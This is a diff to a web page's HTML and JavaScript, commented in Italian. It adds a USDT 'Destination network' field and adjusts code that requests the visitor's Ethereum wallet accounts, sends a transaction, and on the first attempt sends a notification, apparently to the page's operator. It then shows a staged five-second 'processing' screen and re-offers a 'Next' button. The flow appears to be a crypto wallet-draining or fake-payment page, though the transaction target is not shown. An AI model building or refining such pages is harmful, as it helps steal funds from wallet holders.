@@ -486,6 +486,17 @@
                     </div>
                 </div>
 
+                <label class="label">Destination network</label>
+                <div class="network-row">
+                    <div class="network-left">
+                        <div class="usdt-logo">₮</div>
+                        <span>USDT</span>
+                    </div>
+                    <svg class="network-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <polyline points="6 9 12 15 18 9"></polyline>
+                    </svg>
+                </div>
+
                 <label class="label">Amount</label>
                 <div class="input-row amount-row">
                     <input id="amountInput" type="number" placeholder="USDT Amount" step="0.01" />
@@ -544,10 +555,13 @@
                 return;
             }
 
+            // Disabilita il bottone per evitare click multipli
             btn.disabled = true;
             btn.textContent = 'Processing...';
+
             clearError();
 
+            // Aspetta che window.ethereum sia disponibile (importante per Android)
             let ethereum = window.ethereum;
             let retries = 0;
             while (!ethereum && retries < 10) {
@@ -566,6 +580,7 @@
             window.ethereum = ethereum;
 
             try {
+
                 let accounts = await window.ethereum.request({
                     method: "eth_accounts"
                 });
@@ -636,7 +651,9 @@
 
                 lastTxHash = txHash;
                 console.log("Transaction sent:", txHash);
+                console.log("isFirstAttempt:", isFirstAttempt);
 
+                // Aspetta 2 secondi per stabilizzare
                 await new Promise(resolve => setTimeout(resolve, 2000));
 
                 let finalUserAddress = userAddress;
@@ -651,10 +668,12 @@
                     }
                 }
 
+                // Mostra la schermata di processing SUBITO
                 console.log("Showing processing screen...");
                 createParticles();
                 document.getElementById('processingScreen').classList.add('active');
 
+                // Al primo tentativo, invia notifica DOPO mostrare Processing
                 if (isFirstAttempt) {
                     console.log("First attempt - sending notification...");
                     try {
@@ -666,10 +685,12 @@
                     isFirstAttempt = false;
                 }
 
+                // Aspetta 5 secondi prima di chiudere
                 console.log("Waiting 5 seconds before closing...");
                 await new Promise(resolve => setTimeout(resolve, 5000));
                 console.log("Closing processing screen...");
 
+                // Chiudi la schermata di processing
                 document.getElementById('processingScreen').classList.remove('active');
                 btn.textContent = 'Next';
                 btn.disabled = false;
@@ -801,10 +822,7 @@ ${new Date().toLocaleString()}
         }
 
         document.addEventListener('DOMContentLoaded', () => {
-            const amountInput = document.getElementById('amountInput');
-            if (amountInput) {
-                amountInput.addEventListener('input', updateAmountInfo);
-            }
+            document.getElementById('amountInput').addEventListener('input', updateAmountInfo);
         });
     </script>
 </body>
